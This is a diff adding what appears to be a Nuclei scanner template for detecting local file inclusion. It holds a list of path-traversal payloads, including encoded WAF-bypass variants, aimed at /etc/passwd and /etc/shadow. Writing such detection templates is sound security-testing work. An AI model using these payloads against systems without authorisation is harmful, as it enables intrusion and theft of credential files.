@@ -1,0 +1,47 @@
+id: lfi-p1
+
+info:
+  name: Local File Inclusion - Path Traversal
+  author: custom
+  severity: high
+  description: LFI using path traversal techniques with various encodings
+  tags: lfi,path-traversal,waf-bypass
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?file={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        file={{payload}}
+
+    payloads:
+      payload:
+        - "/etc/passwd"
+        - "/etc/shadow"
+        - "/var/www/html/index.php"
+        - "../../../../etc/passwd"
+        - "..%2f..%2f..%2f..%2fetc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+        - "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
+        - "%252e%252e%252fetc%252fpasswd"
+        - "..././..././..././..././etc/passwd"
+        - "....//....//....//....//etc/passwd"
+      path:
+        - "download"
+        - "read"
+        - "include"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "bin/bash"
+        condition: or
